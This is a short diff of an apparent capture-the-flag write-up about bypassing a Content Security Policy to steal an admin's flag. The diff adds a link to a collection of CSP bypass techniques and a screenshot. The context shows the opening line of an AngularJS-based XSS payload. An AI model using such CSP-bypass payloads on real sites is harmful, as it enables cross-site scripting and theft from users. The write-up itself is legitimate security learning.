@@ -42,7 +42,11 @@ However, if we use Google's CSP Evaluator, we learn that the new CSP is still by
 
 ### Stealing the flag from the admin user
 
-With a bit of googling and modifying our payload to achieve the same purpose, we create a new blog post with an arbitrary title and the following content:
+With a bit of [googling](https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques) and modifying our payload to achieve the same purpose,
+
+![](2022-12-06-18-07-13.png)
+
+We create a new blog post with an arbitrary title and the following content:
 
 ```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
